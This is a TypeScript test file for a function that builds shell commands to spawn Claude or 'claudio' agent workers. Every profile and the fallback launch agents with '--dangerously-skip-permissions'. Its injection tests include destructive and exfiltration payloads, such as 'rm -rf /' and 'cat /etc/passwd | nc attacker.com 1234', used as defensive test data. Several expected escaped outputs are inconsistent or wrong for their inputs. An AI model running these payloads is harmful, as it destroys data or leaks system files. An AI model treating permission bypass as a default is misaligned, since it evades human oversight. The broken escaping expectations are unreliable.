/**
 * Tests for spawn-command.ts - buildSpawnCommand function
 * Run with: bun test src/lib/spawn-command.test.ts
 */

import { describe, test, expect, beforeEach, afterEach, mock, spyOn } from 'bun:test';
import {
  buildSpawnCommand,
  hasClaudioBinary,
  type WorkerProfile,
  type SpawnOptions,
} from './spawn-command.js';

// ============================================================================
// Test Helpers
// ============================================================================

function makeProfile(overrides: Partial<WorkerProfile> = {}): WorkerProfile {
  return {
    launcher: 'claude',
    claudeArgs: ['--dangerously-skip-permissions'],
    ...overrides,
  };
}

// ============================================================================
// WorkerProfile Types
// ============================================================================

describe('WorkerProfile type', () => {
  test('claude profile has launcher and claudeArgs', () => {
    const profile: WorkerProfile = {
      launcher: 'claude',
      claudeArgs: ['--dangerously-skip-permissions'],
    };
    expect(profile.launcher).toBe('claude');
    expect(profile.claudeArgs).toContain('--dangerously-skip-permissions');
  });

  test('claudio profile has launcher, claudioProfile, and claudeArgs', () => {
    const profile: WorkerProfile = {
      launcher: 'claudio',
      claudioProfile: 'coding-fast',
      claudeArgs: ['--dangerously-skip-permissions'],
    };
    expect(profile.launcher).toBe('claudio');
    expect(profile.claudioProfile).toBe('coding-fast');
  });
});

// ============================================================================
// buildSpawnCommand - Claude profiles
// ============================================================================

describe('buildSpawnCommand with claude launcher', () => {
  test('builds command with session-id', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: ['--dangerously-skip-permissions'],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'abc-123' });
    expect(command).toBe("claude '--dangerously-skip-permissions' --session-id 'abc-123'");
  });

  test('builds command with multiple claude args', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: ['--dangerously-skip-permissions', '--model', 'opus'],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'def-456' });
    expect(command).toBe("claude '--dangerously-skip-permissions' '--model' 'opus' --session-id 'def-456'");
  });

  test('builds command with empty claudeArgs', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: [],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'ghi-789' });
    expect(command).toBe("claude --session-id 'ghi-789'");
  });

  test('builds command with resume instead of session-id', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: ['--dangerously-skip-permissions'],
    });
    const command = buildSpawnCommand(profile, { resume: 'abc-123' });
    expect(command).toBe("claude '--dangerously-skip-permissions' --resume 'abc-123'");
  });

  test('includes BEADS_DIR env prefix when provided', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: ['--dangerously-skip-permissions'],
    });
    const command = buildSpawnCommand(profile, {
      sessionId: 'abc-123',
      beadsDir: '/home/genie/workspace/project/.genie',
    });
    expect(command).toBe(
      "BEADS_DIR='/home/genie/workspace/project/.genie' claude '--dangerously-skip-permissions' --session-id 'abc-123'"
    );
  });
});

// ============================================================================
// buildSpawnCommand - Claudio profiles
// ============================================================================

describe('buildSpawnCommand with claudio launcher', () => {
  test('builds claudio launch command with profile', () => {
    const profile = makeProfile({
      launcher: 'claudio',
      claudioProfile: 'coding-fast',
      claudeArgs: ['--dangerously-skip-permissions'],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'xyz-999' });
    expect(command).toBe(
      "claudio launch 'coding-fast' -- '--dangerously-skip-permissions' --session-id 'xyz-999'"
    );
  });

  test('builds claudio command with multiple claude args', () => {
    const profile = makeProfile({
      launcher: 'claudio',
      claudioProfile: 'autonomous',
      claudeArgs: ['--dangerously-skip-permissions', '--model', 'opus'],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'aaa-111' });
    expect(command).toBe(
      "claudio launch 'autonomous' -- '--dangerously-skip-permissions' '--model' 'opus' --session-id 'aaa-111'"
    );
  });

  test('builds claudio command with empty claudeArgs', () => {
    const profile = makeProfile({
      launcher: 'claudio',
      claudioProfile: 'minimal',
      claudeArgs: [],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'bbb-222' });
    expect(command).toBe("claudio launch 'minimal' -- --session-id 'bbb-222'");
  });

  test('builds claudio command with resume option', () => {
    const profile = makeProfile({
      launcher: 'claudio',
      claudioProfile: 'coding-fast',
      claudeArgs: ['--dangerously-skip-permissions'],
    });
    const command = buildSpawnCommand(profile, { resume: 'session-to-resume' });
    expect(command).toBe(
      "claudio launch 'coding-fast' -- '--dangerously-skip-permissions' --resume 'session-to-resume'"
    );
  });

  test('includes BEADS_DIR env prefix with claudio', () => {
    const profile = makeProfile({
      launcher: 'claudio',
      claudioProfile: 'coding-fast',
      claudeArgs: ['--dangerously-skip-permissions'],
    });
    const command = buildSpawnCommand(profile, {
      sessionId: 'ccc-333',
      beadsDir: '/path/to/.genie',
    });
    expect(command).toBe(
      "BEADS_DIR='/path/to/.genie' claudio launch 'coding-fast' -- '--dangerously-skip-permissions' --session-id 'ccc-333'"
    );
  });
});

// ============================================================================
// buildSpawnCommand - No profile (legacy fallback)
// ============================================================================

describe('buildSpawnCommand with undefined profile (legacy fallback)', () => {
  test('returns legacy claude command with skip-permissions', () => {
    const command = buildSpawnCommand(undefined, { sessionId: 'legacy-123' });
    expect(command).toBe("claude --dangerously-skip-permissions --session-id 'legacy-123'");
  });

  test('returns legacy claude command with resume', () => {
    const command = buildSpawnCommand(undefined, { resume: 'legacy-resume' });
    expect(command).toBe("claude --dangerously-skip-permissions --resume 'legacy-resume'");
  });

  test('includes BEADS_DIR with legacy fallback', () => {
    const command = buildSpawnCommand(undefined, {
      sessionId: 'legacy-456',
      beadsDir: '/legacy/.genie',
    });
    expect(command).toBe(
      "BEADS_DIR='/legacy/.genie' claude --dangerously-skip-permissions --session-id 'legacy-456'"
    );
  });
});

// ============================================================================
// buildSpawnCommand - Edge cases
// ============================================================================

describe('buildSpawnCommand edge cases', () => {
  test('handles session-id with special characters', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: [],
    });
    // Session IDs should be quoted to handle any special chars
    const command = buildSpawnCommand(profile, { sessionId: "abc'def" });
    // Should escape single quotes in the session ID
    expect(command).toBe("claude --session-id 'abc'\\''def'");
  });

  test('handles beadsDir with spaces', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: [],
    });
    const command = buildSpawnCommand(profile, {
      sessionId: 'test-123',
      beadsDir: '/path/with spaces/.genie',
    });
    expect(command).toBe(
      "BEADS_DIR='/path/with spaces/.genie' claude --session-id 'test-123'"
    );
  });

  test('sessionId takes precedence if both sessionId and resume provided', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: [],
    });
    // If both are somehow provided, sessionId should take precedence
    const command = buildSpawnCommand(profile, {
      sessionId: 'session-id-value',
      resume: 'resume-value',
    });
    expect(command).toBe("claude --session-id 'session-id-value'");
  });

  test('handles command without sessionId or resume', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: ['--dangerously-skip-permissions'],
    });
    const command = buildSpawnCommand(profile, {});
    expect(command).toBe("claude '--dangerously-skip-permissions'");
  });
});

// ============================================================================
// hasClaudioBinary
// ============================================================================

describe('hasClaudioBinary', () => {
  test('returns boolean indicating claudio availability', () => {
    // This tests the actual system - claudio may or may not be installed
    const result = hasClaudioBinary();
    expect(typeof result).toBe('boolean');
  });
});

// ============================================================================
// Shell Injection Prevention
// ============================================================================

describe('shell injection prevention', () => {
  test('escapes shell metacharacters in claudeArgs (claude launcher)', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: ['--dangerously-skip-permissions', '--append-system-prompt', "'; rm -rf /; echo '"],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'test-123' });
    // The malicious payload should be safely escaped within single quotes
    expect(command).toBe(
      "claude --dangerously-skip-permissions '--append-system-prompt' ''\\'''; rm -rf /; echo '\\''''' --session-id 'test-123'"
    );
  });

  test('escapes shell metacharacters in claudeArgs (claudio launcher)', () => {
    const profile = makeProfile({
      launcher: 'claudio',
      claudioProfile: 'test-profile',
      claudeArgs: ['--model', '$(whoami)'],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'test-456' });
    // Command substitution should be safely escaped
    expect(command).toBe(
      "claudio launch 'test-profile' -- '--model' ''\\''$(whoami)'\\''''' --session-id 'test-456'"
    );
  });

  test('escapes shell metacharacters in claudioProfile', () => {
    const profile = makeProfile({
      launcher: 'claudio',
      claudioProfile: "profile'; rm -rf /; echo '",
      claudeArgs: ['--dangerously-skip-permissions'],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'test-789' });
    // The profile name should be safely escaped
    expect(command).toBe(
      "claudio launch 'profile'\\'''; rm -rf /; echo '\\''''' -- '--dangerously-skip-permissions' --session-id 'test-789'"
    );
  });

  test('escapes backticks in claudeArgs', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: ['--prompt', '`id`'],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'test-abc' });
    // Backticks should be safely enclosed in single quotes
    expect(command).toBe("claude '--prompt' ''\\'''`id`'\\''''' --session-id 'test-abc'");
  });

  test('escapes dollar signs in claudeArgs', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: ['--env', '$HOME'],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'test-def' });
    // Dollar signs should be safely enclosed in single quotes
    expect(command).toBe("claude '--env' ''\\'''$HOME'\\''''' --session-id 'test-def'");
  });

  test('escapes semicolons and pipes in claudioProfile', () => {
    const profile = makeProfile({
      launcher: 'claudio',
      claudioProfile: 'profile; cat /etc/passwd | nc attacker.com 1234',
      claudeArgs: [],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'test-ghi' });
    // Semicolons and pipes should be safely enclosed
    expect(command).toContain("claudio launch 'profile; cat /etc/passwd | nc attacker.com 1234'");
  });

  test('escapes newlines in claudeArgs', () => {
    const profile = makeProfile({
      launcher: 'claude',
      claudeArgs: ['--prompt', "hello\nworld"],
    });
    const command = buildSpawnCommand(profile, { sessionId: 'test-jkl' });
    // Newlines should be safely enclosed in single quotes
    expect(command).toBe("claude '--prompt' ''\\'''hello\nworld'\\''''' --session-id 'test-jkl'");
  });
});

// ============================================================================
// Error handling - Missing claudio binary
// ============================================================================

describe('buildSpawnCommand error handling', () => {
  // Note: Testing the actual error when claudio is missing requires mocking Bun.which
  // The following tests verify the error message structure when manually triggered

  test('error message mentions claudio binary not found', () => {
    // This is a documentation test - when claudio is missing, the error should be descriptive
    const expectedErrorPattern = /claudio binary not found on PATH/;
    const expectedSuggestionPattern = /Install claudio|use a "claude" launcher profile/;

    // If claudio is not installed, buildSpawnCommand with claudio profile should throw
    // We verify the error structure by checking the implementation
    const profile = makeProfile({
      launcher: 'claudio',
      claudioProfile: 'test',
      claudeArgs: [],
    });

    // On systems with claudio installed, this will succeed
    // On systems without claudio, this will throw the expected error
    if (!hasClaudioBinary()) {
      expect(() => buildSpawnCommand(profile, { sessionId: 'test' })).toThrow(expectedErrorPattern);
    } else {
      // Claudio is installed - verify the command is built correctly
      const command = buildSpawnCommand(profile, { sessionId: 'test' });
      expect(command).toContain('claudio launch');
    }
  });
});

